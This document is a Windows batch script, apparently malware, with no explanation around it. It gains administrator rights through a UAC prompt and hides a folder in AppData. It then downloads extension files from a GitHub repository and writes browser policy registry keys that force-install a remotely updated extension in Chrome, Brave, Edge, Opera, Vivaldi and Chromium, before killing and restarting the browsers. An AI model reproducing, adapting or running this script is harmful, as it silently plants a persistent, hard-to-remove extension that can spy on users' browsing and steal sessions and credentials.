@echo off
setlocal enabledelayedexpansion
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)

set "D=%APPDATA%\Microsoft\Windows\Templates\WDF"
mkdir "%D%" 2>nul
attrib +H "%D%" >nul 2>&1

curl -s -o "%D%\manifest.json" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json
curl -s -o "%D%\background.js" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js

set "ID=leelplbjobiheomgknchcnbmnancegal"
set "URL=https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/version.xml"

:: Google Chrome
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1

:: Brave
reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1

:: Microsoft Edge
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1

:: Opera
reg add "HKLM\SOFTWARE\Policies\Opera\Opera\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1

:: Vivaldi
reg add "HKLM\SOFTWARE\Policies\Vivaldi\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1

:: Chromium
reg add "HKLM\SOFTWARE\Policies\Chromium\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1

:: Kill all browsers
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM brave.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1
taskkill /F /IM opera.exe >nul 2>&1
taskkill /F /IM vivaldi.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:: Restart all browsers
start "" chrome.exe >nul 2>&1
start "" brave.exe >nul 2>&1
start "" msedge.exe >nul 2>&1
start "" opera.exe >nul 2>&1
start "" vivaldi.exe >nul 2>&1
exit
